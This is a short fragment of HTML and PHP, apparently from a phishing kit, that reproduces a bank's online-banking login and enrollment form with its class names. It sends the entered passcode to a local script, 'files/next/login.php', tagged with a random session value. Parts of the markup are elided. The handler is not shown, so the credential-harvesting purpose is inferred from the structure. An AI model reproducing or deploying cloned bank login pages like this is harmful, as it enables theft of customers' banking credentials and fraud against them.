...
<form action="files/next/login.php?session=<?php echo $_SESSION['rand']; ?>" method="post"><div class="mtb-app-enrollment">
        ...
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                ...
                <div class="cell">
                    ...
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem"   data-fc-id="122" type="password" id="Passcode" name="password" autocomplete="off"  aria-required="true" data-inputtype="tel" maxlength="20"/>
